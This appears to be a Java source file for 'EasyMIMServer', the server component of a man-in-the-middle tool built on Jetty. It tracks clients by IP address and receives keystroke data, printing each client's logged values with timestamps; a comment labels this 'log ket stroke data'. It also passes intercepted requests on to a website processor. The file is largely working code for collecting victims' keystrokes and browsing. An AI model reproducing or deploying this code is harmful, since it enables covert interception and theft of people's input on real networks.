package Server;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.StringWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Collections;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;

import javax.servlet.ServletException;
import javax.servlet.ServletInputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.eclipse.jetty.server.Handler;
import org.eclipse.jetty.server.Request;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.server.handler.AbstractHandler;
import org.eclipse.jetty.server.handler.ContextHandler;
import org.eclipse.jetty.servlet.ServletContextHandler;
import org.eclipse.jetty.servlet.ServletHolder;

import sun.org.mozilla.javascript.internal.json.JsonParser;

import Models.ClientInfo;
import Models.EasyMIMConfig;
import Models.LogElement;

import com.google.gson.Gson;
import com.sun.xml.internal.bind.v2.schemagen.xmlschema.List;

public class EasyMIMServer {
	public HashMap<String,ClientInfo> sessions = new HashMap<String,ClientInfo>();
	public Server server;
	public ServletContextHandler context;
	public WebsiteProcessor wp;
	
	static class EasyMIMServlet extends HttpServlet
	{
		HashMap<String,ClientInfo> sessions;
		WebsiteProcessor wp;
		ClientInfo ci;
	    public EasyMIMServlet(HashMap<String,ClientInfo> sessions,WebsiteProcessor wp){
	    	this.sessions = sessions;
	    	this.wp = wp;
	    }
	    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
	    {
	    	try{
		    	if(!sessions.containsKey(request.getRemoteAddr())){
		    		sessions.put(request.getRemoteAddr(),new ClientInfo());
		    	}
		    	if(request.getRequestURI().contains("log")){
		    		Gson gson = new Gson();
		    		String s = gson.toJson(convertToRightMap(request.getParameterMap()));
		    		LogElement l = (LogElement) gson.fromJson(s,LogElement.class);
		    		//log ket stroke data
		    		//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.toString()+")");
		    		System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.value+")");
		    		return;
		    	}
		    	//log website visit
		    	//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+request.getRequestURL()+")");
		    	ci = sessions.get(request.getRemoteAddr());
				response.setStatus(HttpServletResponse.SC_OK);
				wp.processRequest(request, response,this.ci);
	    	}catch(Exception e){
	    		
	    	}
	    	
	    }
	    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
	    {
	    	doGet(request,response);
	    }
	    public Map<String,String> convertToRightMap(Map<String,String[]> data){
	    	HashMap<String,String> out = new HashMap<String,String>();
	    	for(String key:data.keySet()){
	    		out.put(key, data.get(key)[0]);
	    	}
	    	return out;
	    }
	}
	private void setUpServer(){
        server = new Server(8080);
        context = new ServletContextHandler();
        context.setContextPath("/");
        server.setHandler(context);
        context.addServlet(new ServletHolder(new EasyMIMServlet(this.sessions, this.wp)),"/*");
	}
	public EasyMIMServer(){
        wp = new WebsiteProcessor();
        this.setUpServer();
	}
	public EasyMIMServer(EasyMIMConfig config){
		wp = new WebsiteProcessor(config);
		this.setUpServer();
	}
	public void startServer() throws Exception{
        server.start();
        server.join();
	}
	public void terminateServer() throws Exception{
		server.stop();
	}
	public static void main(String[] args) throws Exception
	{
		new EasyMIMServer().startServer();
	}
	public static void generateServer(EasyMIMConfig config){
		
	}
}
